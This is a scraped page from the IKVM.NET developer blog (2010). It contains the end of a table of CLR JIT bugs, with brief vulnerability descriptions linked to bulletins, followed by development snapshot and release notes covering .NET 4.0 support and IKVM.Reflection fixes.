<TD><A href="https://connect.microsoft.com/VisualStudio/feedback/details/566946/x64-jit-optimization-bug">2010-06-12</A></TD>
<TD>v4</TD>
<TD>x64</TD>
<TD>Incorrect code</TD>
<TD>Optimizer incorrectly propagates invariants.</TD></TR>
<TR>
<TD><A href="http://www.frijters.net/x86-jit-exceptionhandler-crash.il">2010-06-04</A></TD>
<TD>v2, v4</TD>
<TD>x86</TD>
<TD>Crash</TD>
<TD>Access violation while compiling code.</TD></TR>
<TR>
<TD><A HREF="/PermaLink.aspx?guid=d2f792af-a629-4056-ae86-d7deeaa16a1c">2010-04-11</A></TD>
<TD>v4</TD>
<TD>x64</TD>
<TD><A href="http://www.microsoft.com/technet/security/bulletin/MS10-077.mspx">Vulnerability</A></TD>
<TD>Type safety vulnerability caused by incorrect optimization.</TD></TR>
<TR>
<TD><A href="http://www.frijters.net/ExceptionHandlerTypeSafetyHole_NET_4_0_beta2_x64.il">2009-10-28</A></TD>
<TD>v4 beta 2</TD>
<TD>x64</TD>
<TD><A href="http://download.microsoft.com/download/B/5/7/B57D25A2-B3FD-4668-91B9-DB43B6BD910D/NETFx4RTM.htm">Vulnerability</A></TD>
<TD>Type safety vulnerability in exception handler code.</TD></TR>
<TR>
<TD><A href="https://connect.microsoft.com/VisualStudio/feedback/details/285772/x64-jit-throws-system-invalidprogramexception-on-verifiable-il">2007-07-02</A></TD>
<TD>v2</TD>
<TD>x64</TD>
<TD>Exception</TD>
<TD>System.InvalidProgramException on verifiable IL.</TD></TR>
<TR>
<TD><A href="https://connect.microsoft.com/VisualStudio/feedback/details/276714/x64-jit-incorrectly-optimizes-cond-0-0-0-0-to-0-0-constant">2007-05-11</A></TD>
<TD>v2</TD>
<TD>x64</TD>
<TD>Incorrect code</TD>
<TD>0.0 and -0.0 are considered the same by the optimizer.</TD></TR>
<TR>
<TD><A href="http://www.frijters.net/x86-JIT-arrayindex.txt">2006-12-06</A></TD>
<TD>v2</TD>
<TD>x86</TD>
<TD><A href="http://www.microsoft.com/technet/security/bulletin/ms07-040.mspx">Vulnerability</A></TD>
<TD>Ability to access array outside of bounds.</TD></TR></TBODY></TABLE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/14/2010 10:30:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7dece396-5233-4f82-9925-a2edcb400ec0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7dece396-5233-4f82-9925-a2edcb400ec0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="ae363bbd6-e932-4a8e-bcde-57d5bb91b627"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I finished all the .NET 4.0 security model changes. If you build from source, you can now (optionally) build on .NET 4.0 and get native .NET 4.0 assemblies that use the new .NET 4.0 security model (and also experimental class gc support). The .NET 2.0 binaries also work on .NET 4.0.</P>
<P>This is probably the final development snapshot before the first 0.44 release candidate and it has been tested more than a typical development snapshot. Please start testing it and, as always, feedback is appreciated.</P>
<P>Changes:</P>
<UL>
<LI>Final set of .NET 4.0 security model changes.</LI>
<LI>Added "first-pass" build of IKVM.AWT.WinForms.dll and moved "native" AWT code from IKVM.Runtime.dll to IKVM.AWT.WinForms.dll.</LI>
<LI>Fixed verifier bug that caused verification errors if "new" string was interned before verifying any code. Thanks to Andrey Malakov for tracking this down.</LI>
<LI>Include more parts of tools.jar in IKVM.OpenJDK.Tools.dll.</LI>
<LI>Add feature to expand environment variables in system properties specified with -D ikvmc option.</LI>
<LI>Added jdk-tools target to openjdk.build to build javac.exe, javah.exe and javap.exe (not included in the default build).</LI>
<LI>Added build script to build ikvmdoc.exe (not included in the default build).</LI>
<LI>Fixed JNIEnv.DescribeException() (NPE instead of printing the exception).</LI>
<LI>IKVM.Reflection: When the user string heap overflows, throw an exception instead of silently creating corrupt image.</LI>
<LI>IKVM.Reflection: Fixed .PDB emitter to work with .NET 4.0. Thanks to <A href="http://evain.net/blog/">Jb Evain</A> for the heads up on this.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3817.zip">ikvmbin-0.43.3817.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/14/2010 07:53:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e363bbd6-e932-4a8e-bcde-57d5bb91b627"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e363bbd6-e932-4a8e-bcde-57d5bb91b627">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 08 June 2010</h2></div>
<div class="newsItems"><a name="a6edcec7b-6c5b-4373-b71a-a78dbc32cb83"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I finally did the work necessary to improve the codegen for finally handlers. More improvements are still possible, but at least most finally handlers will now execute without touching the exception object (and hence without having to do any mapping/stack trace collection work). It also means that assembly file sizes are a little bit smaller and that the debugging experience should be improved (less exception catching &amp; rethrowing).</P>
<P>Changes:</P>
<UL>
<LI>Restructuring of verifier/analyzer code.</LI>
<LI>Fixed exception stack trace collection regression that caused frame part of the exception stack trace collection infrastructure to show up in some stack traces.</LI>
<LI>Make synthesized .class resources available via ClassLoader.getResources() (note the plural) as well.</LI>
<LI>Use a LinkedHashMap to preserve annotation order (but only in dynamic mode, because for compiled code we get the .NET attributes in unspecified order). By my reading of the API spec there is no guarantee about the ordering, but the Google Guice test suite depends on it.</LI>
<LI>TypeWrapper.AssertFinished() doesn't make sense for the static compiler anymore.</LI>
<LI>Moved mutable flags from Instruction array into separate array.</LI>
<LI>Made ExceptionTableEntry immutable.</LI>
<LI>Implemented codegen improvement to use CLR fault handlers for Java catch all handlers, whenever possible.</LI>
<LI>IKVM.Reflection: Order try blocks inside handlers before the entries for that handler. Workaround for CLR x86 JIT null pointer dereference bug.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3811.zip">ikvmbin-0.43.3811.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/08/2010 08:24:58 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6edcec7b-6c5b-4373-b71a-a78dbc32cb83"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6edcec7b-6c5b-4373-b71a-a78dbc32cb83">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 01 June 2010</h2></div>
<div class="newsItems"><a name="a54d8d733-4700-421b-a241-4d9b4f45985d"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I got a little side tracked by the investigation of the Google Collections test suite performance issue, reported by Albert Strasheim in the <A HREF="/CommentView.aspx?guid=5924f108-3375-4fe7-9809-2939ab1ba85f">comments</A> to the previous snapshot.</P>
<P>This caused me to do some work on exception handling (unfortunately without any performance benefit to the Google Collections test suite) which, in turn, triggered something I've been wanting to do for while, namely to introduce a stub version of IKVM.OpenJDK.Core.dll which can be referenced by IKVM.Runtime.dll during FIRST_PASS compilation, to make it possible to have a cyclic dependency between IKVM.Runtime.dll and IKVM.OpenJDK.Core.dll for method signatures and not just the method bodies as was previously the case.</P>
<P>Changes:</P>
<UL>
<LI>Added (limited) support to ikvmc for cyclic dependency compilation. The build now takes advantage of this to make it possible to use strongly typed method signatures for "native" methods implemented in IKVM.Runtime.dll.</LI>
<LI>Changed reflection to convert any Method|FieldAccessExceptions to occur (in partial trust) into IllegalAccessException.</LI>
<LI>Fixed type conversion verification issues in reflection dynamic methods.</LI>
<LI>Moved exception handling code to IKVM.Runtime.dll (for IKVM.OpenJDK.Core.dll) and cleaned up several issues. Changed mapping API to be more efficient (in terms of bytecode size, and to allow stack trace collection to be bypassed for discarded remapped exceptions).</LI>
<LI>Added new public API to unmap exception (ikvm.runtime.Util.unmapException()).</LI>
<LI>Fixed loop counter integer overflow bug in tableswitch bytecode parsing. Bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3009543&amp;group_id=69637">3009543</A>.</LI>
<LI>IKVM.Reflection: Fixed bug in constructor importing that could cause Module.ResolveMethod() on ModuleBuilder to return the underlying MethodInfo instead of the ConstructorInfo wrapper.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3803.zip">ikvmbin-0.43.3803.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/01/2010 07:36:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=54d8d733-4700-421b-a241-4d9b4f45985d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=54d8d733-4700-421b-a241-4d9b4f45985d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 25 May 2010</h2></div>
<div class="newsItems"><a name="a5924f108-3375-4fe7-9809-2939ab1ba85f"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More bug fixing and rounding out IKVM.Reflection.</P>
<P>Changes:</P>
<UL>
<LI>Fixed resolution of generic type instance names with "fake" type as type argument.</LI>
<LI>Fixed bug in Finalize/finalize special casing for .NET types that caused exception when reflecting on them.</LI>
<LI>Fixed Finalize/finalize special casing for .NET types to also work for java.lang.Throwable derived types.</LI>
<LI>Removed fake core class library types from ikvmstub and added a -bootstrap option to run without dependency on runtime/core class library.</LI>
<LI>Fixed regression introduced when ikvm.runtime.Startup.setProperties() signature was changed. It should also be changed in the executable main stub.</LI>
<LI>Fixed ikvmc/ikvmstub regression introduced with the switch to IKVM.Reflection (not IKVM.Reflection.Emit) in volatile field handling acros assemblies.</LI>
<LI>Fixed several bugs exposed by Google Guice 2.0 test suite (bug #<A href="http://sourceforge.net/support/tracker.php?aid=3004682">3004682</A>).</LI>
<LI>Fixed AssemblyClassLoader so that it does not claim to be able to load .class resources for dynamically loaded classes.</LI>
<LI>When compiling with the -sharedclassloader option we can't do the "effectively final" optimization, because classes in another assembly can be part of the same package (and hence extend the packge private class).</LI>
<LI>Handle the case where the exception block ends at the end of the method.</LI>
<LI>IKVM.Reflection: Implemented Type.IsAssignableFrom() (minus co-/contravariance).</LI>
<LI>IKVM.Reflection: Implemented custom attribute filtering at the source. Added support for custom attribute sub typing.</LI>
<LI>IKVM.Reflection: Added __GetCustomAttributes() overloads for Assembly and Module for ease of use and consistency.</LI>
<LI>IKVM.Reflection: Added ICustomAttributeProvider interface.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3797.zip">ikvmbin-0.43.3797.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/25/2010 06:28:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5924f108-3375-4fe7-9809-2939ab1ba85f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5924f108-3375-4fe7-9809-2939ab1ba85f">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 18 May 2010</h2></div>
<div class="newsItems"><a name="af7ca503e-4387-4c08-84b1-362221a89843"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More IKVM.Reflection fixes and some improvements to ikvmc and ikvmstub.</P>
<P>Changes:</P>
<UL>
<LI>Allow ikvmstub to work with -nostdlib and an explicit path to mscorlib.</LI>
<LI>Fixed ikvmc/ikvmstub assembly resolver to recognize mscorlib by its name, not by having a System.Object type.</LI>
<LI>ikvmc/ikvmstub: Added strong named assembly version "policy" support. Reject lower versions, accept higher versions with optional warning and prefer exact matches.</LI>
<LI>ikvmc/ikvmstub: Added check to avoid loading assemblies that require a newer version of mscorlib than the one were using (to avoid weird exceptions and potential other problems).</LI>
<LI>ikvmc/ikvmstub: Base assembly ref/def matching on Universe.CompareAssemblyIdentity().</LI>
<LI>Changed StaticCompiler.GetType() to be multi-target aware. Instead of looking thru all assemblies currently loaded, only the relevant referenced assemblies are searched. Note that this is a (minor) breaking change. Types referenced in -remap:map.xml file are now only resolved against directly referenced assemblies.</LI>
<LI>Fixed ikvmc regression in custom assembly class loader module constructor support.</LI>
<LI>IKVM.Reflection: It turns out that mscorlib is special cased by the runtime. Any name with a simple name of "mscorlib" is considered mscorlib.</LI>
<LI>IKVM.Reflection: Made mscorlib handling more explicit (and simpler) and fixed Import() to not load assemblies directly, but go through the resolve event.</LI>
<LI>IKVM.Reflection: Added Assembly.CodeBase property and fixes Assembly.GetName() and AssemblyName.GetAssemblyName() to set the CodeBase of the AssemblyName.</LI>
<LI>IKVM.Reflection: Fixed GetReferencedAssemblies() to set AssemblyName.CultureInfo when it's the invariant culture and to set AssemblyName.Flags.</LI>
<LI>IKVM.Reflection: Added AssemblyName.ToString().</LI>
<LI>IKVM.Reflection: Set flags in AssemblyName returned by Assembly.GetName().</LI>
<LI>IKVM.Reflection: Support setting the Retargettable assembly name flag.</LI>
<LI>IKVM.Reflection: Added implementation of Fusion's <A href="http://msdn.microsoft.com/en-us/library/ms231604.aspx">CompareAssemblyIdentity</A> API.</LI>
<LI>IKVM.Reflection: Added RawModule to allow user code to load and inspect a module without it becoming part of the universe and later import it efficiently into the universe.</LI>
<LI>IKVM.Reflection: Made Universe.HasMscorlib internal and removed the now obsolete Universe.LoadMscorlib().</LI>
<LI>IKVM.Reflection: Added protection against accidentally importing any IKVM.Reflection type, not just Type.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3790.zip">ikvmbin-0.43.3790.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/18/2010 16:58:24 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f7ca503e-4387-4c08-84b1-362221a89843"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f7ca503e-4387-4c08-84b1-362221a89843">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 May 2010</h2></div>
<div class="newsItems"><a name="abeb8f57a-ad83-47ff-9b9a-e3d36cd91c70"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More fixes. Thanks to Korn&#233;l P&#225;l for his patches, bug reports and work on porting gmcs to IKVM.Reflection.</P>
<P>Changes:</P>
<UL>
<LI>Removed mcs specific flag that is no longer required.</LI>
<LI>Removed use of reflection for getting the slot of a java.lang.reflect.Field.</LI>
<LI>Implemented <A href="http://java.sun.com/javase/6/docs/api/java/lang/management/RuntimeMXBean.html">RuntimeMXBean</A>. Feature request #<A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2994310&amp;group_id=69637&amp;atid=525267">2994310</A>.</LI>
<LI>Implemented <A href="http://java.sun.com/javase/6/docs/api/java/lang/management/OperatingSystemMXBean.html">OperatingSystemMXBean</A>.</LI>
<LI>Added ikvmc option to disable automagic serialization.</LI>
<LI>Fixed ikvmc to give a proper error message if an output file cannot be created.</LI>
<LI>Added -delaysign option to ikvmc.</LI>
<LI>Added support for AssemblyVersionAttribute and AssemblyCultureAttribute to ikvmc.</LI>
<LI>Added warnings to ikvmc for AssemblyDelaySignAttribute, AssemblyKeyFileAttribute and AssemblyKeyNameAttribute.</LI>
<LI>Added warning to ikvmc when StructLayoutAttribute is ignored.</LI>
<LI>Fixed runtime to register .NET generic type instances with the right class loader (i.e. the special generic class loader that is created, instead of the assembly class loader of the generic type definition).</LI>
<LI>Fixed EnumHelper.GetPrimitiveValue() to handle the case where the underlying type of an enum <A href="http://sourceforge.net/mailarchive/message.php?msg_name=D395C7FC996C944EBD345AB36164F4B2371C1BB9%40woyla.sumatrasoftware.com">differs</A> from the constants values attached to the fields.</LI>
<LI>Added a couple of checks to the runtime to avoid problems when user code tries to convert .NET types that aren't supported into a java.lang.Class.</LI>
<LI>IKVM.Reflection: Fixed a whole bunch of bugs exposed by Korn&#233;l P&#225;l awesome work on porting gmcs to IKVM.Reflection.</LI>
<LI>IKVM.Reflection: Removed TypeForwardedToAttribute support and added explicit API to do the same. Modified ikvmc to use new API.</LI>
<LI>IKVM.Reflection: Removed DefaultParameterValueAttribute support.</LI>
<LI>IKVM.Reflection: Fixed AssemblyName.GetAssemblyName() to throw the proper exceptions.</LI>
<LI>IKVM.Reflection: Implemented ModuleBuilder.GetArrayMethod(). Based on patch from Korn&#233;l P&#225;l.</LI>
<LI>IKVM.Reflection: Removed CheckBaked() from __GetDeclaredXxx methods and moved it to .NET compatible APIs only.</LI>
<LI>IKVM.Reflection: Added support for defining mscorlib assembly.</LI>
<LI>IKVM.Reflection: Added __SetAssemblyVersion(), __SetAssemblyCulture(), __SetAssemblyKeyPair(), __SetAssemblyPublicKey(), __SetAssemblyAlgorithmId() and __SetAssemblyFlags() methods to AssemblyBuilder.</LI>
<LI>IKVM.Reflection: Added support for delay signing.</LI>
<LI>IKVM.Reflection: Added TypeBuilder.__SetAttributes() and MethodBuilder.__SetAttributes() to allow modying the attributes after the builder has been created.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3782.zip">ikvmbin-0.43.3782.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/10/2010 07:26:53 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=beb8f57a-ad83-47ff-9b9a-e3d36cd91c70"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=beb8f57a-ad83-47ff-9b9a-e3d36cd91c70">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 03 May 2010</h2></div>
<div class="newsItems"><a name="a460a7479-f96f-49e2-ae7f-5e018732525a"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Update 1 Released</h3>
	<div class="entryBody">
		<P>I've promoted <A HREF="/PermaLink.aspx?guid=4aefc3af-c523-424c-a940-89d7fdcf50c6">0.42 Update 1 RC 2</A> to an official <A href="http://sourceforge.net/projects/ikvm/files/">release</A>.</P>
<P>Changes (Update 1 RC 0 + RC 1 + RC 2):</P>
<UL>
<LI>Added fix to mangle all artificial type names if they clash with Java type names in the same assembly.</LI>
<LI>Fix for <A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696">http://gcc.gnu.org/bugzilla/show_bug.cgi?id=41696</A>. </LI>
<LI><A href="https://sourceforge.net/mailarchive/message.php?msg_name=295e750a1001102223x4a3aa94av93e8938086ccb08b@mail.gmail.com">Fixed exception sorter</A> to be correct when invoked with two references to the same object.</LI>
<LI>Fix for bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=2946842&amp;group_id=69637">2946842</A>.</LI>
<LI>Fixed ikvmstub to not emit stubs for generic type definitions. </LI>
<LI>Fixed several incorrect usages of Type.IsArray when we only want to deal with vectors.</LI>
<LI>Fixed timezone handing bug for unrecognized timezone names.</LI>
<LI>Several partial trust fixes.</LI></UL>
<P>The 0.42 release notes can be found <A HREF="/PermaLink.aspx?guid=75a5b8a3-7605-4f6f-a466-8d6c4632f7e3">here</A>.</P>
<P>If you want to build from source, you need <A href="https://sourceforge.net/projects/ikvm/files/ikvm/0.42.0.3/openjdk6-b16-stripped.zip/download">openjdk6-b16-stripped.zip</A> from the 0.42.0.3 folder.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/03/2010 07:10:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=460a7479-f96f-49e2-ae7f-5e018732525a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=460a7479-f96f-49e2-ae7f-5e018732525a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 23 April 2010</h2></div>
<div class="newsItems"><a name="a412f90cc-2fc3-4e97-9bb6-78adfd4561fd"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>A fairly massive set of changes this time, mostly around .NET 4.0 suport and IKVM.Reflection fixes.</P>
<P><B>Targetting .NET 4.0</B></P>
<P>Please note that the work isn't done yet (in particular, I haven't checked in all the changes required for the .NET 4.0 security model), but it is now possible to build assemblies with ikvmc that target and reference .NET 4.0 while running ikvmc on the .NET 2.0 runtime.</P>
<DIV style="BACKGROUND: black">
<TABLE>
<TBODY>
<TR>
<TD noWrap><FONT color=#d0d0d0 face=courier>
<P>C:\j&gt;ikvmc test.class -nostdlib -lib:\windows\microsoft.net\framework\v4.0.30319 -r:mscorlib.dll<BR>Note IKVMC0001: found main method in class "test"<BR>Note IKVMC0002: output file is "test.exe"</P>
<P>C:\j&gt;test<BR>Hello World, running on CLR 4.0.30319.1</P></FONT></TD></TR></TBODY></TABLE></DIV><BR>
<P>Note that (like the C# compiler) you can also reference .NET 4.0 assemblies while targetting .NET 2.0, but when you run the resulting assembly on .NET 2.0 and it tries to load the .NET 4.0 assembly that will fail with a BadImageFormatException.</P>
<P>The algorithm that ikvmc uses to load assemblies now resembles what csc uses and does not involve the CLR anymore. The same switches are used (-nostdlib, -lib and -reference), but there are some subtle differences. The most important being that ikvmc's -nostdlib also removes the current CLR runtime directory from the search path and that the -reference option (like it always has) has a runtime consequence (because it affects class loader delegation) and the assemblies that aren't explicitly required by the code being compiled will be silently loaded from the library search path (which is: current directory, CLR directory (except if -nostdlib is specified), -lib:&lt;dir&gt; directories, LIB environment directories).</P>
<P><B>Breaking Change</B></P>
<P>The above mentioned changes to assembly loading by ikvmc result in some (potential) breaking changes for build scripts. In particular, the -reference option could previously be used with a partial name (which would be resolved by the CLR with the <A href="http://msdn.microsoft.com/en-us/library/system.reflection.assembly.loadwithpartialname.aspx">Assembly.LoadWithPartialName()</A> method), but this is no longer supported (to ease transitioning you can still specify the simple name of the assembly and the ikvmc assembly resolver will append ".dll" to it, but it will issue a warning about this.)</P>
<P>Changes:</P>
<UL>
<LI>Started implementing the various required changes for the .NET 4.0 security model. This is not finished yet, so running on .NET 4.0 with this snapshot is not yet supported.</LI>
<LI>.NET 4.0 fix: When class GC is enabled, don't intrinsify ThreadLocal.</LI>
<LI>.NET 4.0 support: When class GC is enabled, throw a VerifyError when custom attributes as used that aren't allowed in RunAndCollect assemblies.</LI>
<LI>Added parameter validation to ikvmc's -version option (bug <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2987144&amp;group_id=69637&amp;atid=525264">#2987144</A>).</LI>
<LI>Added System.Core target to build a tiny custom version of System.Core.dll that contains only System.Runtime.CompilerServices.ExtensionAttribute and will allow us to build on .NET 2.0 without having to figure out where System.Core.dll lives (or without it even being present).</LI>
<LI>Removed lib/security/local_policy.jar from vfs.zip (because, by default, OpenJDK builds the restricted version) and instead make a vfs alias for it that points to the unrestricted US_export_policy.jar.</LI>
<LI>Changed ikvm.runtime.Startup.setProperties() to take an IDictionary instead of Hashtable. This allows a Dictionary&lt;string, string&gt; to be passed in now and avoids future problems if/when we want to target Silverlight (which doesn't have System.Collections.Hashtable).</LI>
<LI>Rewrote assembly loading for ikvmc and ikvmstub (and unified it). It now no longer depends on the runtime to do assembly name to path resolution and behaves more csc like.</LI>
<LI>Added -nostdlib and -lib options to ikvmc and ikvmstub.</LI>
<LI>IKVM.Reflection: Fixed stack height updating for jmp instruction.</LI>
<LI>IKVM.Reflection: Don't crash when a DllImportAttribute doesn't have an ImportScope (which can happen for C++ code).</LI>
<LI>IKVM.Reflection: Version parts should be treated as unsigned.</LI>
<LI>IKVM.Reflection: Don't loop infinitely when field RVA lies outside of the file.</LI>
<LI>IKVM.Reflection: Don't try to return a MethodBody if the method isn't in IL.</LI>
<LI>IKVM.Reflection: Implemented ModuleRef ResolutionScope for TypeRef.</LI>
<LI>IKVM.Reflection: Fixed type name parsing bug (thanks to Jb Evain for reporting this). Generic type parameter type names can be without assembly name and then need to be resolved in context.</LI>
<LI>IKVM.Reflection: Added workaround for broken compiler(s) that add terminating NUL to type names in custom attribute data.</LI>
<LI>IKVM.Reflection: Added support for custom modifiers in generic type instantions (in signatures).</LI>
<LI>IKVM.Reflection: Having PinvokeImpl set doesn't necessarily imply having an ImplMap record (for mixed mode assemblies).</LI>
<LI>IKVM.Reflection: Made __GetDataFromRVA more general by taking an offset and a length (to be able to reuse the byte array) and this also removes the need for the field type to have a StructLayout.</LI>
<LI>IKVM.Reflection: A Version object that only has Major.Minor set will return -1 for Build and Revision. Handle that case by setting these parts to zero, instead of casting to 65535.</LI>
<LI>IKVM.Reflection: Added support for delay signing (i.e. setting the public key without having the private key).</LI>
<LI>IKVM.Reflection: Dynamic assemblies should also be visible in the universe.</LI>
<LI>IKVM.Reflection: Fixed default assembly resolver to throw/not throw the right exceptions.</LI>
<LI>IKVM.Reflection: Made method/field signature reading lazy. This makes building assemblies with circular dependencies easier.</LI>
<LI>IKVM.Reflection: Fixed method signature handling of custom modifiers (required and optional were mixed up).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3765.zip">ikvmbin-0.43.3765.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/23/2010 09:51:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=412f90cc-2fc3-4e97-9bb6-78adfd4561fd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=412f90cc-2fc3-4e97-9bb6-78adfd4561fd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 06 April 2010</h2></div>
<div class="newsItems"><a name="a4aefc3af-c523-424c-a940-89d7fdcf50c6"></a><div class="entry">
	<h3 class="entryTitle">0.42 Update 1 RC 2</h3>
	<div class="entryBody">
		<P>I back ported a couple more fixes to the stable release.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 0.42.0.6.</LI>
<LI>Fixed ikvmstub to not emit stubs for generic type definitions.</LI>
<LI>Fixed several incorrect usages of Type.IsArray when we only want to deal with vectors.</LI>
<LI>Fixed timezone handing bug for unrecognized timezone names.</LI>
<LI>Several partial trust fixes.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.6.zip">ikvmbin-0.42.0.6.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.6.zip">ikvm-0.42.0.6.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/06/2010 07:40:36 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4aefc3af-c523-424c-a940-89d7fdcf50c6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4aefc3af-c523-424c-a940-89d7fdcf50c6">Comments [0]</a>
		
